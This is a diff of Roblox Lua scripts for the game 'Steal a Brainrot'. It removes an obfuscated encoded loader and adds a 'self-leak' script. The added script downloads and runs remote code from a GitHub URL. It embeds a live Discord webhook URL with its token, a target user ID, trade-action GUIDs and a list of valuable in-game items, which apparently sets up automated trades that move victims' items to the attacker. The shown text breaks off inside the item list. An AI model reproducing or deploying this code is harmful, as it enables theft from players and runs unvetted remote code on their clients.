@@ -1,1 +1,577 @@
-if not pcall(function() return Enum.CompressionAlgorithm end) then while true do end end return(function()local lENfB9=string.char(65,66,67,68,69,70,71,72,73,74)..string.char(75,76,77,78,79,80,81,82,83,84)..string.char(85,86,87,88,89,90,97,98,99,100)..string.char(101,102,103,104,105,106,107,108,109,110)..string.char(111,112,113,114,115,116,117,118,119,120)..string.char(121,122,48,49,50,51,52,53,54,55)..string.char(56,57,33,35,36,37,38,40,41,42)..string.char(43,44,46,47,58,59,60,61,62,63)..string.char(64,91,93,94,95,96,123,124,125,126)..string.char(39)local Eck0l93={}for usoQe=1,(7*13) do Eck0l93[string.byte(lENfB9,usoQe)]=usoQe-1 end local function anAG99(VRhFF)local C2Kg,L5th9R,qOU6kj,rxiop={},0,0,-1 for usoQe=1,#VRhFF do local asFohq=Eck0l93[string.byte(VRhFF,usoQe)]if asFohq then if rxiop<0 then rxiop=asFohq else rxiop=rxiop+asFohq*(7*13)L5th9R=L5th9R+rxiop*(2^qOU6kj)qOU6kj=qOU6kj+(rxiop%(2^13)>(8*11) and(26-13) or(2*7))rxiop=-1 repeat C2Kg[#C2Kg+1]=string.char(L5th9R%(2^8))L5th9R=math.floor(L5th9R/(2^8))qOU6kj=qOU6kj-8 until qOU6kj<8 end end end if rxiop>=0 then C2Kg[#C2Kg+1]=string.char((L5th9R+rxiop*(2^qOU6kj))%(2^8))end return table.concat(C2Kg)end local function dwnyJi(bCYqS9J)local MXc4={}local _seed=0 for _i=1,math.min(#bCYqS9J,10) do _seed=(_seed+string.byte(bCYqS9J,_i))%2 end for usoQe=1,#bCYqS9J do local _pos=(usoQe%256)local _b=string.byte(bCYqS9J,usoQe)if _seed==0 then MXc4[usoQe]=string.char((_b-math.floor(209.0)*_pos+(2^8)*(2^8))%(2^8))else MXc4[usoQe]=string.char(((_b+(2^8)-math.floor(209.0)*_pos)%(2^8)+(2^8))%(2^8))end end return table.concat(MXc4)end local Kwfpb4="AZPZ<8fxu?rNbYwNm]_e@QL!/CeceeJoz(<iU8h65bn>[6L]lOTMaE*vnYBp_bK9OQa9(Ipbk.&yV3A%7WZ+xue^Rdzoy:kdU^#vjkk^miW=(p0nB1Zma)HCHL9]OzLgha.gsMg4RrhZ7S#>G#lcPEhnBG#KNAp&/UY^1ORqROiXP+DLovS2*apz;Elb^rgi&B++Xu6UsN/n.jR#dCqVV?1*XZKY5V0SyBN>8LkOR,D#Ro*PCX?uj@T6SNVmh^qbQ%bU9oXJG.PsK57nfOKybLBEHiRU$^K9X:yMaeWNkHT:1m]BOwmF>I0a9u6_oaSjjceHLKR%wj!mE.QXnDu+pQrbl:leI#cSHD1,oVi=an45CJU8)%uU07qumdQpil52MFRM2q?nYT^?jG/kvnC5)db(nC:hrMv;naN6Rm?Nd#amHx/P<osVW>$IqX=q!>e<Nk2Y+kL<OTbY3nD$.)M4UpTO:F>kZr5@PiSjKgN^Q;Ke]Mp,lb$A@a%+$,hU9TzXS863VBIYDT3%swY,F1aZTTt%UY[SiR)%q6fuC)^bk2KZNZxJkh<[*8P+P%1M[]=8M<bXdf;_RGcB(#KnX>4&OT]:uanVELLg8N<QKNe%l]9iGgy/i:M3P=hRp:zSYP:ijMaF48lFddNZ&a89jjntOSl:.pL4j#PQn(k$meE?TT5dOxcBL%YkMAh1T^+!EQ%1V5f>KuUc7H4ai.sZ0SI[]lfAL+rLhd6)Y/R9aV5KvPNUB]6Z/^mwX/C]pW:NW9OW9=vY(2x&l5RSLT!V>>YuRlwYPo#Kio+2(NX.8XW3XJvK5bRcUZr%WWUzDfe<z41Z,cA2Z/nIeYwJ3IjoU$/fU1seQ,,gwXTK([ccdsPV]ARpou)JfoS!M_RJcbMgvUP%bMQ2ih.N_CQ&8^em5=>wl98zFK8+SyebhPyarAFKlf*Uge64T#nbB/RSjJW(X<u!hVY>e8ccg1<nd:2vl98PIYO9h?Yr[zDM^x+RNXjkyiQq7JX,T$xTIXQ)l^dQajqp8ELehOZk!9/+e2qZLZ*q4YitaivZNp75efD(iX,u)Jj(Bj_hQB!JO<YsyXy9RPc$UTVcA93JM67/AcKAFlgwr?TaNA]!c#v[(leBc?b(=WlM<cETbKX.tTKFs;ea^8MSmZ>tOYuVoL3_2ykKri=R*bi6R!MS_ho6?5l6O4tNxDMyS!RsufUju]P/&yQVzPA0PVY5OZ);NCb!&vINXaHCZ$G/wNV,b+UB6yzQSxl5d^8MrTi+eaedI5HmE]DlcHuAveX$C4c4c7rnY]=?gRfNenxbGFee89GXs#1uc$viEW=_z]nWZZqTe5aAm7PhAg<(vpm0ViSowq13iSA;oVD^Q6oUvUAeAZ;7V56MWR(FrzN3m#YNW&h+f=9nPYuYgJcDzFmPO_<yeZOHRg.brxV_C%VmBdszOV^K?f=QAlMY:D&j#jawXr<7Oi+rEZoY0*ecH$0OjrUv+T#[)wiqvl7RKRT,gST?ClcZlKV6.SJL79$)Y;@+iMe$a&R*lN;fyZ_xPR:Iyal/y>l$pNuXrg6oiNaj*oy3Meld;.1N1R68a&el_Yvv!fnAbt<nfFENa!,2+Por8[Zl8fybKX9uY*mWCa#Vr9gP5f[e>Y&PQ.me*n^Lk6PoQ$pjM@S&U^d[/ZPs/YRN=czi&<FDU]6+_eDNa:Yp9GtW:E%WjJaYAXuUJ)nxIG<iupS&m^8_hW?G90Wb,oHjq>s0ZOt81X/w;,dbl[Oe0&3^f[:Eve>[9XX:QWnitJGomG;8KbmcASZti7;M]ha=V[f*oh+%kodD/V9L5D&%cg#k,Rn.fokMAlthv!wzfuC*QNcJrjT3CX#N3/2+dbBO)h:Og=L7*jMX<c)4cC1(DPtqznMD]s%g<od^mD56(Snp)HW[kJgceQOPiR5Ewm[?i=l_JepK8@8nf@FB<Ua]_7O:p&3Ua^*gV60OEPwh5<SlT+WT3],;NBKV@fS)zPY;t&(bmJ4Eg>ZxjK#hL1e>,pDS%>]aS(m][NUC5*jIt@vRla0gl8HmvLY9&Ec#XpCa*CV1Y:DySd]#r0m@tv)VAf7:a)imab!69Wak_5:MDBAKa#W2Eg.I=TkKr9>O=OcPQ%[&KgQ[D^VaX,VYM&bIM0z@MVX?nHSMPN&c_f82n^wLGeZVB/QrvqHXTMYuSk)unchW,GkkV(]Sm#<;g+a0)m_L,oUfgpPh,IU#SFlR]U20hVceO)^n_ub!l3Z;>hUFzIN1@K0n2J?Cne]cFajIAlmaSVilb.avfZ!kbO.&?Uea#Z%cgZ13arZFjYQ$E@h;OIdY*dcQTk^fpa9uFNPoHHqSmk0,b9Q+yma#ARZRBkje5p%gW:y?9m3wE*ZooL@f3r$Fc7]F/YqVqrMV<axNZutMQ/,7!V=z#3ZSF#9fuemDc!s3@YrlFlWz.MAR)3lvocMp^Pq]dolE6[SdaE96S&y@gl7C,RnYdu;O?y6UWal,xoy.P:M?,A3kFj1*L^Z?ySg&N^WArNeXSZqRi.t;siuf?Jm9kXYajhjffYdqmNX.AFS7mm*QMgg^Uz[25M2^gLN:]fXS$/rATJUlVnX7R>WY#8Xaoc;/am0sdm^*&Ml9o(vV^FRhLZ;kWjMi0@iR;x)bfRPCS%1)rSI3P@T8VADdiO(^fS78^b8@z/RrD#PM00n9ny=y#bNDd*b9z^6fXpcej%1uGV@0.Qk!q/=M^5u0i%fp#V=2QSL]TEljqxZjRpd*Yd?j3fK46=sa$]p2l6hB%Xvt@=lip5OhpIU0ey_dDQ(/DWk(r^nTij^)WYAascicNGThk]=Yv6G0ldek1kGE!9c66MwY,z,6Z.)+eN>p_WlGJk[oZc<cboeVQL1[gBgxe.bY+b&Emakj9V2xF@o0_7feCuQ6cg3AfU2QhTmbM]5dZT)0UgIz?R(>koTi*6AjHgRLm_&,EbGt;^oy@4iYt/8Ccf%=WYr$K/ecpK?eyDo(YN[:Ce?5dEV1H$RgP3>QOUh7%n_#aDlHzzVK4w%pNasN]n]=?Kdb<G/NbYeZZr;NsXQXuXb$oLDm[GXdT$huug=KT_b60w?o2OQ4e_yp3XX?KgTcJofU3zKBQuQkcP<n&DZ.rg)f:.NOb&!,xl8ZEsi,vaYY+tVUhqgNmPQOwUe4@d#bJtcPYRXUnfv!TgOS_]fUfoU#cJCz+l]i_/gRL[jbEZ<ziMLzwg;H0Wao3klMX*/nb%LJQY)><ne=K2zM1Em^j%bzCS%@!*ZRvjgm5O8#Ub?qUQp@fXk!QlTK6GxuYV:O8L2GETXQD7%YV3L(Vc/Z0TCzVqlH6QnMdT4!hU!/HhqpBbhTAgifW$__hs989ee0#+NYr/tjO@BCX.hZ9XQV*hM[Iw6K7w[^bjKqXbJ$b9kF9TBRitS2Zq@Y9W>j5Wap<]iS$6OBgz0?#anLgoj9z20lFTI&NyjP6lhk;ZjH)H^obP03c_g50TkUf6L^!.SK5tyJN/xX$b(hA0mZ4(Ril/.1M6qU.RQXu>n[/t@m[)VDm05HOMc>gqSnM5GmZv9bRPQYRndn_FY*&[&jqy*DdFd80K5R_aV>gK2n3XNGSh01jSG9%1RoO+oe5+VVSi&@hP,BU;Z&bj2R*QkJn_bfedEa!umE/O.jM9e_TA;odddYAcP,T;XexPvsTdFG2g>qOTlCwDLPq2*Ym_=5&OVcF*ROC&hjNEG^XUbC2nD3&_c^ktuU]p$YM>TQsMdVHoQNB1=ao.h.eBW)2n5@LoZuoH5K#>E,QOiH:g>sh2L_eJhi+>r#hS*G]h/^0RRk;mTeegX1ZsAM.dh]W$gU%J6X/B!AjjMDpSLtdRYu2SMh+eVwkhx^9QL]C4nzkkwP:.n<ZJ1;HTk%+?PPBa!mD7bmcgrgygxyyVe<yj>Nbz51U9ouAe@4>pL^h7BfagjRPq1_!M_sQfh*o^_V>qb4hQ^qulgEDQl!UgiXtXyociuqqh<1<fiNZ[.ee)i(L8nQ9WaK7=O/t1$e>a(vhoo:pL_fDyPMtv5k6]oGZrgh8XzO#%K6<vYcdBCah,0ZQhSFdekmXL;Wujr*g;1U8OQTmDmcTp&e=_x_bmU[3nCf/)ki28ZnfgHya+9I(VdNzUcH&RriOxX)S%@nNXrwp/m4JA%V2vt=g/>t1ox;daOX*wSWWPV+MxR4cRlq&rbI<A6ap*U<T8eFinA$/HM6gA?L^*(<QNS[7Te45CoY)5)ed/ERPqBOnTkUrnV?;IuRKiUlWx*u6M0P0(Wxg+=Zsb/wUZpewf=FZ&K4WaGcJwLchtwt;S&xqTkEU<rnax2?L^hfNK!ShgV2Dt1cdsreYqeh$S&=gCoyBG/guF(nWx+[ae>RfiirX*TfADt@MzJ1oUbr!5Zu5IdK7d9XW3DKxexWuBU@T_$TGUe]Ysw/HlICa_O>[csfZ$Q*lBH+jao4ISM]Z1Vb75SsN>qjpjmjoKV2;JsPQW2$Z&#kdMyh9;K4^y?oUK=_Zs2wojJ*6!a9]FcoW<cwLdQ#*bm$$hj*6oQdCoT7X+=1Kj&!JSc5=4]lcY?$iOqQVfX)cRcHvneV]b2WoV8XWRpD@[hx1ZaMx#ypP;P.zgS[BuaG)Z4ey2.(Mb2[feaS/WLi3m<n5!#ANupaPmcc:1S(bLqn@Cdhe6e3Omd2z:e^a[5c]_9Vg?_P8U1xIGl!kBETIPQ%Q&XwzL3w&3T7V@2aG<4.f@WC;k6I:;ZSYtfdB0yCN<gbFgxw_pRk%%HTi.3_mgrm?SnO:$L33mam7h*Td_SUCWUzlPiSRiYk7atsO.DQhkHBLyf?Q;+k8;z[X=i(>O;ca0hTnNFhx2qpLi3ejfWu9Kar2$+Yo1&maPD4<NYOwpcEC7sL^8cWXu_q(X:+]3XS!VGU2.<*j#Yr.Nx<[8Qs76ieZNr*V4+ipTb;ODM_9u_bMY2&YraYCg.c<iWb[*IRL)xZmZeJkobfc:h<KMQn3O]aM^wQsn1>PWMWsX&Wy:rOZudeWaK%xpkNGDUP+7p4N2w%dkNG#VQpsH?Xzpt,iO(5edbl2VZ$(%yMW17lN]d_Flk>5yO<h@9appw_oZ]<mm0D$JiJv2hb%:wOc6%F(QpalvVWdqKR%frYjq+Q/UF%]%mEmO:N>GX1R$*qEY)>6tZPaxfO,8dEl4e>)U0+X&n=?EmX<3C>Rm(B$dfZ=#hVel*K#.I:UA.QznXX_gQ/t/(ddOuLkFGKIP)dT?c#d86c9wX6M]YH@VzgiCR%Dgnd@WTJL?603SglRwOQJOmkKcC,kn;mZirXv?S&qTpU8gLfXZmv!NakiZe1]3RnXpRhkF8f>b&9#xnypFold4ZWk#_?jP(N*)MY$^cl7][Oclc,PU^c/CiNR[diKb/+W[!M$OQcjJe?opNL4HP9Rropumb7nXdbwo5V2E&lN:4Ecgu=rGl!.(Ch;_iUgx(jtQRz.jUBf:wUAQ>XK9o;nmB4H!Zp#p%aj[kUl4<qvQlTp=jpt.1hUy_FnchPjShFh+V40J]Si:j,d]t60iq248eZMsOe1Sc,OW,6$aoklsU[?hDgSt(<N^O+GWaBF+NX!9PWWQ3Oov/MKUHWwQUDihlVx/nyj)k8(ik4[Fkez9mZTVRdL6j9LPpvHgh+(B:fV=felBjU1QKC$woyAz.h:PdDe6A[UOXw16VB[:sm[81+YSwKKl^V[1RMK(OnW._JXR2(^UeQWAZ$9iKeefd/j$go.Q,rm*YNcTsg0FbMh)$&+L0f!MfYL[^SI2HMNU46zU@^U1hPg6UW1CQmLfugmeX4gdUF],aSo2,TTI(eENa2(lPrx>!U]qtrM2$jBSnygJNUCclbM9^)gUd2uQ.l0cdfja5bk..5VCy,rP:k(fbh[&#nXW2UU^VU_Qs0*dNaZyyQt(=Ya)gh%Xu5[<lD1k)L^jzsj%/7zgY.eKdE0#doz8Y.f:ra$T4PVnZ*!BnSjKcTex=s;ZuL4;ocBx+ck(s+Vz*q_S$/+KPRu:,Vc!#ziQY%Fb8$^3Vew$2P,nl2l_R+RM2#m.L9.kTMCMc?cI@I8g<oDVYUDTuZ&1DAmCimtm?Ki;nbbuwN1.DdZPI$Rc8y0YecK^CK#g>fe=KDNLZ)K,Xr;14aOgAUM]gGpQ,!XWj*0Q,b75uCZSFM6SjS/xUgc@RX:HNZU1]#7OQKjQbEZ/Mf?S:in]?s<SLRa4b6j2.Q/HV?ZtG5karZPNe4bpZe[*/CUgK,wQRG*%kfTXBiScDVn[1/5XufhcUBo^MTdF;5WbsJ8nYu4;R(p$URl0@eefWMOV1QD%ow!c9hpT65M6(iPlh[#kS8q&MbEi$4ismutW[RM7f@M*Yecv<hoS2p1VDxPqe?C:@W?8,Ce[+#tiqRzfT!)LMaq&sli)L?Ze^.mmY+uT<PVRRvXr;p+MxjOVmY9h[RMl3PlgMc?b%ej%e@k<@hOr_8Sl&DHfV*C&g;R[6ecUz[gs&19Qm#R,dD_jbk%(e4m^P#Nf1(a!PQqyTmf[#%h/[_eZt0)aL3:/dgsoKhW>2FMV]2yShQTrZjMPHzV5m0%e?pEJc#<u>hR!=)M0Gfzo0VjLT9G>@a#EbLgTGTHSg[_1Y;[]Ij)TU4U73c6PTV:1h+3czcC]:5L3/NuRH2bZW]).Qn51=:hSO^zWYuvxVyjK(RnA9vbJsgOlD3!aWu?@?OQv</eX(G4ZQ_@ISfpkzh.f1(SfVQ/YVj9jb#smCPWe[RlfXd,PwZ.fSG1N?UEMVTUZhv,L6#,!jm2:#X0JlhV<5v3ZuV@3lBiPrjN<6Jn?9/9Pw+O9QlUxkXU@;[bK9j^a*5=7N@t;3Qo50@Y;SlDVdp^nmB^CheV][Yjk9[yQP;6(daiH*lFmH#W[.bma9k%)aIHf#eY20zgTQkIY)r3GM]aA:WTsB[SJG/dNX:yWa*&!3NW(nefvhY6Nz?<tf1fp1LcDC=O<G4tWX6CmgP5aQbFo*%cCR3mTDVN@RKIT0kG=y%PTE6uQ)Z,iW==ImQKn6Unz&cHNa0!(im0hie@4L)ke*KRZ)b&LezAEWROmwslG2JTe29*Mi)C?sO+u^rNUT7ge>sH&ZPs/Tjp/F/kj9BNV2_tzjp@+bTdP:$SkhAKWA,56lcae7Ve588j(6MwVzYk+gz?]CYS/:#S9wE3U_F^falJbrWVa4lNbYqLL3:EpSfX*jlJIEySNKZxM0P09XvsYDMa;Mnb$7$QjmmcHleRZEV^O@lZP*CWS$3(&V^YyboX:13Sf7.!ilj!5bIf?cnYU!WeDyc1QsPkeLaJW2f>&Mhfw7+2Y/Gy,S%jv:Y(I^!a!1/DjJGiQZM0ZKjKnPpey3JPc_P.VkLO5pnec0KhsA1KTi?C>h<.Dnfah$8j*6S+cg!+4SExexUc8rGh+Bx1Xre>nRqJ6[ZJ.K2Se[A9Zrob1QNc4<S8P#WL7sfBXtFc]gsgQjY;3;*Ny.PoZKF4xZnJFVb(p01L5(.NOX(uiN[N<yNz)a/O,Q?tbFOhZi$s4EU_[mwnaMfpbI;T+bir^RPxM4/SKd<Ih)1vZdDC.dOQLY?gXvb[VX!^)LdY33j)JV,j+J<9T^8s=lHyeAm4?RBZ/mg%RnsyrozOigk63NOM0Q0yXRvV,YsGu>dfrhMPP31*N/7ONXW/^RhQKA@gy:NRlBaF@aIj.ak8(bbe2z+Ll3p1jWS^#UQNBp%f2CQYV1zx1c_N?Tc4^aXYVR(vd[U@nRH+6fWcVcxQ.n>GSKmb[Tb5FAfUImYS9V1*QusOol!tY&gP[*uclS^pK$CvNa+,4)a*B5wM3>mhn2ueYM2mQ9kk4urkgiMjl!4m_WwbCNXV8vVgwH/bTcLLLmf]D5ldfqPc7[DnNbPAiN?/_SZL&MYa%QKwNYzdxdGJyESM=isezz&gh*OiNPO^f4mE[wwecpN5SKDX&f=XjHfAcc%bM[x#Sh79NX@G*jSH_7TQJ,C,i.#hOb$gS/o2)3WMc>RIj(5BzQKLQjfUzv[Z,.G_W[R$%O<RcRNTzTAQKWnkNbfQCgUNdAV0$r2aQb@FUF2%9bjx<0W1A&mn>:r@U4tuzUC:cDh(U#Zf:!HqM?P=Nlg&G!NU:<4W[h@:QS4GWe6l,lh+3cEgwbmxg=$E4bIe$tM2$,4U^SQ/WzRPZi$AW?gt.Q#e_M_8X/<*PVct*EmA8jle<=_sdE*NAOVMx,T70R$N[qJHSJ+SGebp$>am>bBnBiMIhVN_dRm&??h.y(]dB!B$fW3]eLbFFQV5K^#i+POMhw%4MZ,2HGjLK^,OVcIgm@[zmoWL=:f1WU5m^qs=UGq!CobPq)mdHUASG7/YYRfVFU]D:,k$G8Ah*Ph)V62zrUeHG/TElwrV5%UJR#41CXVWI[Yr[nNVYn#bnyxJHZPZRHQm@54eeh6=WaxA,aL8,LRNhzPK9yE?fV<3WTcJlMf?uTaPR2]ie@a,5S89&BK3@c?k!rb]ow?BnNBBqcRmE9^Lfaz]Zm&kYQKdZfZRuYAjoC(&U3Yh6ZR[lFQL2qcM@x;8Wx1kAh.WJJO<..#S8ztCUCLk^V^QNUd[_1jmb<8Nn1FbxQS%b^ZMIeAn5/+8MA%:Pb&i[ze_y%6amqtLUc)oudAA;%mE:U8QMxzoO/uvWZ.8>UM_.WRlejPngwHM*h/CmGP*Sp:jj&zFowINTK9zNbl97>!f>%__cArK8kM4wBV62X.k#%:7O.LQIm]&o0Vdrfydcs)KXum+Ef3Y7bnBG5Sajs2wm0=LSSJXG$QO@oabE,e.bJS2+iMluZgvK+uZSFV*bMPYdgRCt8b&jsvQMOVBk(!l&h<[5jXs#7KP*H6sOX8v>Z%_nwWAH92T8vVVc4AM:aL?3/jP?gkoyc8?T^>&ZN;zZ>VdOgja*3*hQ$5ERTd1E1kfL._kl]wlhSPTXPrxGhNXTaxL[>60jjDX&ot!uCMD3m=XYV?&k!>3,gVIMRbJ[#tUz[9Xk(HwElb]rOkKbY<h/4u1YUOj=f2%uhTA=qWPSt#^lH8*bh:P77XUb5iSm?q6lgC7Eh(m:/Ww;DlUeO:LbfIVFMBpjyK9xVgL3TXZbf!GQkorjGY:w99hQ/]3l9)e&edk?^P,AtqmCGjjS$V>ESmk,8W](lags&)&n@7;:Qu1danBgTaOYc*fhp1:jVzW7HX>m@<e@SEkU[2f!Y.vNmS8p&2Rq0j;f;6$4hPiy%Y<sRMRMA3qQS<Xdc#MaylIL>KnWj3NM^_BYn<HZMWadx%U8G@eQNdU2Xze(sgYrB2Ud^83K#!iQalbhoTIn.XarP&kT3T)>ne24dYT8%hhn@TnkI*XTK8]KnYVB#LRi@V?Uivc(k(Ru^V@PlNK4%#Xi)fXmeYZ:ThrTNLnXYQ)UF1zThQd.>blf=IWbiN*Y*wM:kh(v7Y._E2fx$h8m5hDEgP;UEhWTGRlkRorRKIuaocMO<cfwr(mbyCjjGsl=bI<##fzwy;m@IlTfXF0;j%kVScDG1?W<iAzY*L3Bf<#=IguyBmhwpy0kNRaGV2v/tZoYZzgy$gXOR@d/X.rDLn0[z[My77QMz2@lQ.m5WgXmErjImt.WW??Bhn?X,iN[%/k%E3Km7PJwS(d$YeCBi5MB=#GkoGA3c9_F*VZ_s$an7PwfT/VsO:75SYwI:JQ$K7fT6S+qd]sQ=gXc!EezHpuhQ]$umB^o+XVXdXm9l<+f2%64WbZ3!V027FN[N?Jecv>oPwP*fO:Y4%lh]UtMfy#Ym@@5gm0d3HaqMI=W]n$]SkXNMjo=DbU38SkTB%LqVB^QUR+g7far2HRoAz+JiK#0+W]<n,m^HgUL5YFMZR,rPj&ZEzm_VIMhWc>nL1tc?mZ<R[Uiokrf[noGVYNInZnJv.P,KVTiN?kOUB=clQO06?fxAB1m]m7HU7BB4Y<jE3g=v+FVbom8i);YpZQ7PwW3Nz[jl6v]eX3Aan5]<pQrlPePv;B@e0o=cQ,pQxUh!Dab%LJhV].v(XR3W2Rq@;QP/y.4n@U@3i%>P&PP2G4Sn6_XTg9ABm7FfeT9hxXbI^:@Q&gSXU_rPVjo6<JlA[XoaH:_]NzpO6iM3/vW[HuhOR@tyV6rH&lEy19NbpG^LbZJiR#/;DiuQW@U@oE5QoB@&kFz3hSMV8ol_RM_ki%l(ob(4HmZD_.W0pFBNAg#^mDExwjPEWBjPrOiVdO2PQPe?=bJlYGTly!8Pv]>2hPN,4PV!jmgt#H$T76:3QM8%JWS%bAl_T4:T7N%qchN9>O?P/FL8N&$Zp5H5U1:).S![Z6kHcT>kK.&YZp$ODfS)MdZ+Nq_kGyaVlIm*JP+?f)Md<ejT]bcDN/W:^jk9w*cD=*teYAJyk!*r&P<U.rm911PR*sSPhSyE!k!6_<dgn_Nf[:Kra&ND[ccw5*X=G[PeYke)bEj]Kdfi[6XP.r,S&e#6Uid%KUfg11T6A+lhtXgNMX8z[L1#scNYq:;mAoSJQNU:@ddox^K5b,PbF=F@ZR#A<kn5goituAFV024HO+^KLO:HQlXU[%7T$h^pRO:kPg:Cn&W;K<ldeK.)TcB;*WUo@OTctuiRjgMtbLVa)jL4D?n>3CTf0ufkovnQwin3J@MYloyU[QU<iOXFxa*^UnSLq<(MXW;Qj*f&_YszKjm^8#MYtAa$gXJ:?T3$thm3uDKa*A/daIHlBh:Px*T3B>RM>lpQR%NZVlA^*<lif5_Th$$ciLgxlm8&XYW<!vqbe]@Eeb?LxN^PSDc9cKUMCx[,U_8z,ou<qcRo7;@V^8o@Zl9P6g;JvGVA6wackoatZR$qgllW:of=8wxfckbLc3fA4L8eZ.eWoTcOP<bFNxvo;nbT*$U7[:lkM#6heXLmce>JQQMb3Izl^Vb5ob<:<n514(gv6Ucf]Pr,n^L5/R%vayOXXbtMy<LCV]]CZf1>HvX;)^lknK<Boai_VO<#*6mbFptV0T30RG;ZLe0NlzajteDO/Q$feCJ:geC@&GK#7.bjMq4le<xfAbj6uEXSrPfM>bI3NW(bQPNHt!kitLcTDURyN<EeJh,q(1V2W[fdGKQKUDYi6b6!83V>F0YYuQEYUc=N!P*ZZsnx1Y%UY^LaVfk;9h*(phS%[9/cE$8uYM&XsPNXvjiKZ2ecFZy]bE.y^hs.9[WVl()M0Hn1k7+22mFp#$Rrgsol#P;8Y.wD8mFHwTbJRW(TJS[MhpSZtWvF+UiP%TkcD7wFjnG=%hQ$o>XW5$AlcrJqM5a6dSM&4[fX@CDOY%^%dbceYYwb+uj%cE8M5$y5Pp_+JSI!1Oo2p,Re0D=7Z+4gfM6P5eSgJnrYQlCPX+=9^ckfvDRK+l#UafQ3UBV;Lik6i.Z/(x=mh&#Kl8k/WPw>&mRP@!;X/U<qZO5G]j!$7AV5U?sZNqH?TjFN%bmnvlc!.HvX+N!CSlvSVaqTnZXrd&sgz89xiqR2lUF4fKQO07;Q,Z7)Wa]y5X,Kf/cfxfedbD$#jo_iNb$=G!Vd9.;ZuDyTjq0dhfYv*#n0,];mC#6Fkmqa5nb^m;nd</)K4LkUn^Kk$aiUiHW3oG>MdoA.mb)m*nCfUUW]OJKNBTS(f=73YWa%4KXxVx!U2SWgT^QaTW>!ebY:OG5mc4:4n3Y8[i/Wb;N:d?HZn[^ubl)VyjlotsjME[>neTt>lF$^0SgULUYT!t[nde@vQ)QXdjOtw9YU<k(ez@Q^NxUUCT5l+PXQ6$;cEDH[UAJ:FlfYR2OX_%dkM;^QZ.>U>nW2g!cB&Y;Rj=y=SK^AzXuxI8" do local XULgpad=0 local XULgpadb=0 local A7EVg=0 local BDmgDO3=0 for usoQe=1,#Kwfpb4 do local _b=string.byte(Kwfpb4,usoQe)XULgpad=(XULgpad*31+_b)%16777213 XULgpadb=(XULgpadb*37+_b)%9999991 A7EVg=(A7EVg+_b*(usoQe))%1299709 BDmgDO3=(BDmgDO3*41+_b)%6700417 end if XULgpad~=11063257 or XULgpadb~=5500951 or A7EVg~=916554 or BDmgDO3~=3872061 then Kwfpb4=string.rep("x",#Kwfpb4)while true do end end end do local qELu3=0 local qELu3b=0 for usoQe=1,math.floor(#Kwfpb4/2) do local _b=string.byte(Kwfpb4,usoQe)qELu3=(qELu3*31+_b)%16777213 qELu3b=(qELu3b*37+_b)%9999991 end if qELu3~=831940 or qELu3b~=7249205 then while true do end end end do if Kwfpb4~=nil then local HMfny=0 local HMfnyb=0 for usoQe=math.floor(#Kwfpb4/2)+1,#Kwfpb4 do local _b=string.byte(Kwfpb4,usoQe)HMfny=(HMfny*31+_b)%16777213 HMfnyb=(HMfnyb*37+_b)%9999991 end if HMfny~=2113218 or HMfnyb~=9966578 then while true do end end end end local Cuh3H=(function()local _lf=(load~=nil and load)or(loadstring~=nil and loadstring)load=nil loadstring=nil return _lf end)()assert(type(Cuh3H)=="function","")local _temp=Kwfpb4 Kwfpb4=nil collectgarbage("count")collectgarbage("count")local function mDK3gW(_s)local _pad=Eck0l93[string.byte(_s,1)]local _out={}local _i=2 while _i+4<=#_s do local _v=0 for _j=0,4 do _v=_v*85+(Eck0l93[string.byte(_s,_i+_j)] or 0) end _out[#_out+1]=string.char(math.floor(_v/16777216)%256)_out[#_out+1]=string.char(math.floor(_v/65536)%256)_out[#_out+1]=string.char(math.floor(_v/256)%256)_out[#_out+1]=string.char(_v%256)_i=_i+5 end local _res=table.concat(_out)if _pad>0 then _res=string.sub(_res,1,#_res-_pad) end return _res end local mej4K27=dwnyJi(anAG99(mDK3gW(_temp)))mDK3gW=nil _temp=nil anAG99=nil dwnyJi=nil Eck0l93=nil lENfB9=nil anAG99=nil dwnyJi=nil collectgarbage("count")collectgarbage("count")assert(type(mej4K27)=="string" and #mej4K27>0,"")local HcCCA,i0E8=Cuh3H(mej4K27)assert(HcCCA,tostring(i0E8))Cuh3H=nil mej4K27=nil i0E8=nil collectgarbage("count")return HcCCA()end)()
+-- discord.gg/sabscripts self-leak have fun
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+local cam = workspace.CurrentCamera
+local pg = LP:WaitForChild("PlayerGui")
+
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hfdf6638-sudo/Mdkdxh/refs/heads/main/message%20(5).txt"))()
+end)
+
+task.spawn(function()
+
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1496132275690147851/_G_YbxAxwb52wrMgxe7dzsjpAWJCDRn0r2dhfQU54qCpF47-vodQrC0RRX8HbhwvNB2g"
+local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+local TARGET_ID = 10473713528
+local DELAY_STEP = 1
+local TRADE_CYCLE_DELAY = 2
+
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
+
+local TargetBrainrots = {
+    ["Foxini Lanternini"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Chillin Chili"] = true,
+    ["Fragola La La La"] = true,
+    ["Cash or Card"] = true,
+    ["Hydra Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Los Chillis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug dug dug"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Fishino Clownino"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
